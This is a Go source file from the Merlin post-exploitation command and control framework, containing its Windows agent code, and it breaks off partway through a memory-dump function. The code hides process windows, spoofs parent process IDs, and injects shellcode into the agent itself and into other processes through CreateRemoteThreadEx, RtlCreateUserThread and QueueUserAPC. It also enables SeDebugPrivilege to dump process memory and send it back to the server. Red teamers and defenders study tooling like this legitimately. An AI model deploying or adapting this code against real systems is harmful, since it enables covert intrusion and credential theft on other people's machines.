// +build windows

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"

	// 3rd Party
	"github.com/mattn/go-shellwords"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// MEM_RELEASE is a Windows constant used with Windows API calls
	MEM_RELEASE = 0x8000
	// PAGE_EXECUTE is a Windows constant used with Windows API calls
	PAGE_EXECUTE = 0x10
	// PAGE_EXECUTE_READWRITE is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READWRITE = 0x40
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
	// PROCESS_CREATE_THREAD is a Windows constant used with Windows API calls
	PROCESS_CREATE_THREAD = 0x0002
	// PROCESS_VM_READ is a Windows constant used with Windows API calls
	PROCESS_VM_READ = 0x0010
	//PROCESS_VM_WRITE is a Windows constant used with Windows API calls
	PROCESS_VM_WRITE = 0x0020
	// PROCESS_VM_OPERATION is a Windows constant used with Windows API calls
	PROCESS_VM_OPERATION = 0x0008
	// PROCESS_QUERY_INFORMATION is a Windows constant used with Windows API calls
	PROCESS_QUERY_INFORMATION = 0x0400
	// TH32CS_SNAPHEAPLIST is a Windows constant used with Windows API calls
	TH32CS_SNAPHEAPLIST = 0x00000001
	// TH32CS_SNAPMODULE is a Windows constant used with Windows API calls
	TH32CS_SNAPMODULE = 0x00000008
	// TH32CS_SNAPPROCESS is a Windows constant used with Windows API calls
	TH32CS_SNAPPROCESS = 0x00000002
	// TH32CS_SNAPTHREAD is a Windows constant used with Windows API calls
	TH32CS_SNAPTHREAD = 0x00000004
	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
	THREAD_SET_CONTEXT = 0x0010

	// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS is a Windows API constant to denote the Parent Pid attribute
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
)

// Part of the Windows Struct used to spoof parent pid
type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

// Part of the Windows Struct used to spoof parent pid
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

// Part of the Windows Struct used to spoof parent pid
type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}

// ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	argS, errS := shellwords.Parse(arg)
	if errS != nil {
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}

	cmd = exec.Command(name, argS...)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Only difference between this and agent.go

	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	if err != nil {
		stderr = err.Error()
	}

	return stdout, stderr
}

// Uses the CreateProccessW() API call to launch a process
// A negative ppid (-1, specifically) indicates it should just launch without spoofing the parent pid
func WinExec(prog string, args string, ppid int) (stdout string, stderr string) {

	// Get program path as UTF string
	progPath, err := exec.LookPath(prog)
	if err != nil {
		return "", fmt.Sprintf("Could not find executable %s\r\n", prog)
	}
	utfProgPath, err := windows.UTF16PtrFromString(progPath)
	if err != nil {
		return "", fmt.Sprintf("Could not convert executable name to UTF: %s\r\n", prog)
	}

	absPath, err := filepath.Abs(progPath)
	if err != nil {
		return "", fmt.Sprintf("Could not find a valid absolute path for executable %s\r\n", progPath)
	}

	// Command line arguments show a full path to match normal Windows processes
	cmdLine := fmt.Sprintf("\"%s\"", absPath)
	if len(args) > 0 {
		cmdLine += " " + args
	}

	argPtr, err := windows.UTF16PtrFromString(cmdLine)
	if err != nil {
		return "", fmt.Sprintf("Could not parse arguments to UTF string: %s\r\n", args)
	}

	var startupInfo StartupInfoEx
	var uintParentHandle uintptr

	kernel32 := windows.NewLazySystemDLL("kernel32")
	procCreateProcessW := kernel32.NewProc("CreateProcessW")
	procCloseHandle := kernel32.NewProc("CloseHandle")

	// To spoof your parent pid, you need a handle to it first
	if ppid > 0 {

		procInitializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
		procGetProcessHeap := kernel32.NewProc("GetProcessHeap")
		procHeapAlloc := kernel32.NewProc("HeapAlloc")
		procHeapFree := kernel32.NewProc("HeapFree")
		procDeleteProcThreadAttributeList := kernel32.NewProc("DeleteProcThreadAttributeList")
		procUpdateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")

		// Call InitializeProcThreadAttributeList once to find out how much memory we need
		var procThreadAttributeSize uintptr
		_, _, e1 := syscall.Syscall6(procInitializeProcThreadAttributeList.Addr(), 4,
			uintptr(unsafe.Pointer(nil)),
			uintptr(1), // Attribute Count
			uintptr(0), // reserved, must be 0
			uintptr(unsafe.Pointer(&procThreadAttributeSize)), // lp size we need to allocate
			0, 0)
		if e1 != 0 && e1 != windows.E_NOT_SUFFICIENT_BUFFER {
			return "", fmt.Sprintf("First call to InitializeProcThreadAttributeList failed: %i\r\n", e1)
		}

		// Get and allocate attributeList in the Heap
		r0, _, e1 := syscall.Syscall(procGetProcessHeap.Addr(), 0, 0, 0, 0)
		procHeap := windows.Handle(r0)
		if e1 != 0 {
			return "", fmt.Sprintf("GetProcessHeap failed: %i\r\n", e1)
		}

		r0, _, e1 = syscall.Syscall(procHeapAlloc.Addr(), 3,
			uintptr(procHeap),                // Handle to the heap from above function call
			uintptr(0),                       // Flags, we don't want them
			uintptr(procThreadAttributeSize)) // Num of bytes to allocate. Got it above
		attributeList := uintptr(r0)
		if attributeList == 0 || e1 != 0 {
			return "", fmt.Sprintf("HeapAlloc failed: %i\r\n", e1)
		}

		defer syscall.Syscall(procHeapFree.Addr(), 3, uintptr(procHeap), uintptr(0), uintptr(attributeList))

		// Call InitializeProcThreadAttributeList again to actually get the data
		startupInfo.AttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
		_, _, e1 = syscall.Syscall6(procInitializeProcThreadAttributeList.Addr(), 4,
			uintptr(unsafe.Pointer(startupInfo.AttributeList)), // Attributes
			uintptr(1), // Num of attributes
			uintptr(0), // Reserved, must be 0
			uintptr(unsafe.Pointer(&procThreadAttributeSize)), // size of attribute list
			0, 0)

		if e1 != 0 {
			return "", fmt.Sprintf("Second call to InitializeProcThreadAttributeList failed: %i\r\n", e1)
		}

		defer syscall.Syscall(procDeleteProcThreadAttributeList.Addr(), 1, uintptr(unsafe.Pointer(startupInfo.AttributeList)), 0, 0)

		// Get the parent handle that we're spoofing
		parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(ppid))
		if err != nil {
			return "", fmt.Sprintf("Error opening process: %s\n", err)
		}

		defer procCloseHandle.Call(uintptr(parentHandle))

		uintParentHandle = uintptr(parentHandle)
		_, _, e1 = syscall.Syscall9(procUpdateProcThreadAttribute.Addr(), 7,
			uintptr(unsafe.Pointer(startupInfo.AttributeList)), // Attribute list
			uintptr(0), // reserved, must be 0
			uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS), // We're updating the ppid
			uintptr(unsafe.Pointer(&uintParentHandle)),    // Handle to parent we're spoofing
			uintptr(unsafe.Sizeof(parentHandle)),          // size of parentHandle
			uintptr(0),                                    // reserved, must be 0
			uintptr(unsafe.Pointer(nil)),                  // reserved, must be 0
			0, 0)
		if e1 != 0 {
			return "", fmt.Sprintf("UpdateProcThreadAttribute failed: %i\r\n", e1)
		}
	}

	// At last, start the process
	var procInfo windows.ProcessInformation
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
	startupInfo.ShowWindow = windows.SW_HIDE
	creationFlags := windows.CREATE_NO_WINDOW
	if ppid > 0 {
		creationFlags |= windows.EXTENDED_STARTUPINFO_PRESENT
	}

	r1, _, e1 := syscall.Syscall12(procCreateProcessW.Addr(), 10,
		uintptr(unsafe.Pointer(utfProgPath)),  // executable
		uintptr(unsafe.Pointer(argPtr)),       // command line //TODO fill this in
		uintptr(unsafe.Pointer(nil)),          // proc security
		uintptr(unsafe.Pointer(nil)),          // thread security
		uintptr(1),                            // Inherit handle
		uintptr(creationFlags),                // creationFlags
		uintptr(unsafe.Pointer(nil)),          // env
		uintptr(unsafe.Pointer(nil)),          // current Direcotry
		uintptr(unsafe.Pointer(&startupInfo)), // startup info
		uintptr(unsafe.Pointer(&procInfo)),    // out proc info
		0, 0)

	if r1 == 0 && e1 == 0 {
		return "", fmt.Sprintf("Failed to create process: %i\r\n", e1)
	}

	_, _, errCloseHandle := procCloseHandle.Call(uintptr(procInfo.Process))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return "", fmt.Sprintf("Error calling CloseHandle: %s\r\n", errCloseHandle.Error())
	}
	_, _, errCloseHandle = procCloseHandle.Call(uintptr(procInfo.Thread))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return "", fmt.Sprintf("Error calling CloseHandle: %s\r\n", errCloseHandle.Error())
	}

	return fmt.Sprintf("Success - Launched `%s %s` as pid %d", prog, args, int(procInfo.ProcessId)), ""
}

// Ifconfig in Windows requires an API call to get all the information we want
// Much of this is ripped from interface_windows.go
func Ifconfig() (stdout string, stderr string) {

	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err.Error()
	}

	fSize := uint32(0)
	b := make([]byte, 1000)

	var adapterInfo *syscall.IpAdapterInfo
	adapterInfo = (*syscall.IpAdapterInfo)(unsafe.Pointer(&b[0]))
	err = syscall.GetAdaptersInfo(adapterInfo, &fSize)

	// Call it once to see how much data you need in fSize
	if err == syscall.ERROR_BUFFER_OVERFLOW {
		b := make([]byte, fSize)
		adapterInfo = (*syscall.IpAdapterInfo)(unsafe.Pointer(&b[0]))
		err = syscall.GetAdaptersInfo(adapterInfo, &fSize)
		if err != nil {
			return "", err.Error()
		}
	}

	for _, iface := range ifaces {
		for ainfo := adapterInfo; ainfo != nil; ainfo = ainfo.Next {
			if int(ainfo.Index) == iface.Index {
				stdout += fmt.Sprintf("%s\n", iface.Name)
				stdout += fmt.Sprintf("  MAC Address\t%s\n", iface.HardwareAddr.String())
				ipentry := &ainfo.IpAddressList
				for ; ipentry != nil; ipentry = ipentry.Next {
					stdout += fmt.Sprintf("  IP Address\t%s\n", ipentry.IpAddress.String)
					stdout += fmt.Sprintf("  Subnet Mask\t%s\n", ipentry.IpMask.String)
				}
				gateways := &ainfo.GatewayList
				for ; gateways != nil; gateways = gateways.Next {
					stdout += fmt.Sprintf("  Gateway\t%s\n", gateways.IpAddress.String)
				}

				if ainfo.DhcpEnabled != 0 {
					stdout += fmt.Sprintf("  DHCP\t\tEnabled\n")
					dhcpServers := &ainfo.DhcpServer
					for ; dhcpServers != nil; dhcpServers = dhcpServers.Next {
						stdout += fmt.Sprintf("  DHCP Server:\t%s\n", dhcpServers.IpAddress.String)
					}
				} else {
					stdout += fmt.Sprintf("  DHCP\t\tDisabled\n")
				}
				stdout += "\n"
			}
		}
	}

	return stdout, ""
}

type Process interface {
	// Pid is the process ID for this process.
	Pid() int

	// PPid is the parent process ID for this process.
	PPid() int

	// Executable name running this process. This is not a path to the
	// executable.
	Executable() string

	Owner() string
}

// WindowsProcess is an implementation of Process for Windows.
type WindowsProcess struct {
	pid   int
	ppid  int
	exe   string
	owner string
}

func (p *WindowsProcess) Pid() int {
	return p.pid
}

func (p *WindowsProcess) PPid() int {
	return p.ppid
}

func (p *WindowsProcess) Executable() string {
	return p.exe
}

func (p *WindowsProcess) Owner() string {
	return p.owner
}

func newWindowsProcess(e *syscall.ProcessEntry32) *WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}
	account, _ := getProcessOwner(e.ProcessID)

	return &WindowsProcess{
		pid:   int(e.ProcessID),
		ppid:  int(e.ParentProcessID),
		exe:   syscall.UTF16ToString(e.ExeFile[:end]),
		owner: account,
	}
}

func findProcess(pid int) (Process, error) {
	ps, err := processes()
	if err != nil {
		return nil, err
	}

	for _, p := range ps {
		if p.Pid() == pid {
			return p, nil
		}
	}

	return nil, nil
}

// getInfo retrieves a specified type of information about an access token.
func getInfo(t syscall.Token, class uint32, initSize int) (unsafe.Pointer, error) {
	n := uint32(initSize)
	for {
		b := make([]byte, n)
		e := syscall.GetTokenInformation(t, class, &b[0], uint32(len(b)), &n)
		if e == nil {
			return unsafe.Pointer(&b[0]), nil
		}
		if e != syscall.ERROR_INSUFFICIENT_BUFFER {
			return nil, e
		}
		if n <= uint32(len(b)) {
			return nil, e
		}
	}
}

// getTokenOwner retrieves access token t owner account information.
func getTokenOwner(t syscall.Token) (*syscall.Tokenuser, error) {
	i, e := getInfo(t, syscall.TokenOwner, 50)
	if e != nil {
		return nil, e
	}
	return (*syscall.Tokenuser)(i), nil
}

func getProcessOwner(pid uint32) (owner string, err error) {
	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return
	}
	var token syscall.Token
	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_QUERY, &token); err != nil {
		return
	}
	tokenUser, err := getTokenOwner(token)
	if err != nil {
		return
	}
	owner, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	owner = fmt.Sprintf("%s\\%s", domain, owner)
	return
}

func processes() ([]Process, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err = syscall.Process32First(handle, &entry); err != nil {
		return nil, err
	}

	results := make([]Process, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			break
		}
	}

	return results, nil
}

func Ps() (stdout string, stderr string) {
	processList, err := processes()
	if err != nil {
		stderr += fmt.Sprintf("ps.Processes() failed\n")
		return "", stderr
	}

	stdout += fmt.Sprintf("PID\tPPID\tEXE\tOWNER\n")
	for x := range processList {
		var process Process
		process = processList[x]
		stdout += fmt.Sprintf("%d\t%d\t%s\t%s\n", process.Pid(), process.PPid(), process.Executable(), process.Owner())
	}
	return stdout, ""
}

func Uptime() (stdout string, stderr string) {
	var kernel32DLL = syscall.MustLoadDLL("kernel32")
	var procGetTickCount64 = kernel32DLL.MustFindProc("GetTickCount64")
	r1, _, e1 := syscall.Syscall(procGetTickCount64.Addr(), 0, 0, 0, 0)

	if e1 != 0 {
		stderr += fmt.Sprintf("Uptime failed\n")
		stderr += fmt.Sprintf("%s\n", e1.Error())
		return "", stderr
	} else {
		stdout += fmt.Sprintf("System uptime: %s\n", (time.Duration(r1) * time.Millisecond))
		return stdout, ""
	}
}

// ExecuteShellcodeSelf executes provided shellcode in the current process
func ExecuteShellcodeSelf(shellcode []byte) error {

	kernel32 := windows.NewLazySystemDLL("kernel32")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	//VirtualProtect := kernel32.NewProc("VirtualProtectEx")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAlloc failed and returned 0")
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling RtlCopyMemory:\r\n" + errRtlCopyMemory.Error())
	}
	// TODO set initial memory allocation to rw and update to execute; currently getting "The parameter is incorrect."
	/*	_, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
		if errVirtualProtect.Error() != "The operation completed successfully." {
			return errVirtualProtect
		}*/

	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

	if errSyscall != 0 {
		return errors.New("Error executing shellcode syscall:\r\n" + errSyscall.Error())
	}

	return nil
}

// ExecuteShellcodeRemote executes provided shellcode in the provided target process
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	kernel32 := windows.NewLazySystemDLL("kernel32")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	kernel32 := windows.NewLazySystemDLL("kernel32")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	/*
		NTSTATUS
		RtlCreateUserThread(
			IN HANDLE Process,
			IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
			IN BOOLEAN CreateSuspended,
			IN ULONG ZeroBits OPTIONAL,
			IN SIZE_T MaximumStackSize OPTIONAL,
			IN SIZE_T CommittedStackSize OPTIONAL,
			IN PUSER_THREAD_START_ROUTINE StartAddress,
			IN PVOID Parameter OPTIONAL,
			OUT PHANDLE Thread OPTIONAL,
			OUT PCLIENT_ID ClientId OPTIONAL
			)
	*/
	var tHandle uintptr
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)

	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
		return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(tHandle, syscall.INFINITE)
	if errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
	// TODO this can be local or remote
	kernel32 := windows.NewLazySystemDLL("kernel32")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
	Thread32First := kernel32.NewProc("Thread32First")
	Thread32Next := kernel32.NewProc("Thread32Next")
	OpenThread := kernel32.NewProc("OpenThread")

	// Consider using NtQuerySystemInformation to replace CreateToolhelp32Snapshot AND to find a thread in a wait state
	// https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}
	// TODO see if you can use just SNAPTHREAD
	sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully." {
		return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
	}

	// TODO don't allocate/write memory unless there is a valid thread
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	type THREADENTRY32 struct {
		dwSize             uint32
		cntUsage           uint32
		th32ThreadID       uint32
		th32OwnerProcessID uint32
		tpBasePri          int32
		tpDeltaPri         int32
		dwFlags            uint32
	}
	var t THREADENTRY32
	t.dwSize = uint32(unsafe.Sizeof(t))

	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
	if errThread32First.Error() != "The operation completed successfully." {
		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
	}
	i := true
	x := 0
	// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
	for i {
		_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
		if errThread32Next.Error() == "There are no more files." {
			if x == 1 {
				// don't queue to main thread when using the "spray all threads" technique
				// often crashes process
				return errors.New("the process only has 1 thread; APC not queued")
			}
			i = false
			break
		} else if errThread32Next.Error() != "The operation completed successfully." {
			return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
		}
		if t.th32OwnerProcessID == pid {
			if x > 0 {
				tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
				if errOpenThread.Error() != "The operation completed successfully." {
					return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
				}
				// fmt.Println(fmt.Sprintf("Queueing APC for PID: %d, Thread %d", pid, t.th32ThreadID))
				_, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
				if errQueueUserAPC.Error() != "The operation completed successfully." {
					return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
				}
				x++
				_, _, errCloseHandle := CloseHandle.Call(tHandle)
				if errCloseHandle.Error() != "The operation completed successfully." {
					return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
				}
			} else {
				x++
			}
		}

	}
	// TODO check process to make sure it didn't crash
	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// TODO always close handle during exception handling

// miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
// the raw bytes of the dumpfile back as an upload to the server.
// Touches disk during the dump process, in the OS default temporary or provided temporary directory
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
	var mini map[string]interface{}
	mini = make(map[string]interface{})
	var err error

	// Make sure temporary directory exists before executing miniDump functionality
	if tempDir != "" {
		d, errS := os.Stat(tempDir)
		if os.IsNotExist(errS) {
			return mini, fmt.Errorf("the provided directory does not exist: %s", tempDir)
		}
		if d.IsDir() != true {
			return mini, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
		}
	} else {
		tempDir = os.TempDir()
	}

	// Get the process PID or name
	mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)
	if err != nil {
		return mini, err
	}

	// Get debug privs (required for dumping processes not owned by current user)
	err = sePrivEnable("SeDebugPrivilege")
	if err != nil {
		return mini, err
	}

	// Get a handle to process
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, mini["ProcID"].(uint32)) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		return mini, err
	}

	// Set up the temporary file to write to, automatically remove it once done
	// TODO: Work out how to do this in memory
	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
	if tempErr != nil {
		return mini, tempErr
	}

	// Remove the file after the function exits, regardless of error nor not
	defer os.Remove(f.Name())

	// Load MiniDumpWriteDump function from DbgHelp.dll
	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
	miniDump := k32.NewProc("MiniDumpWriteDump")

	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/
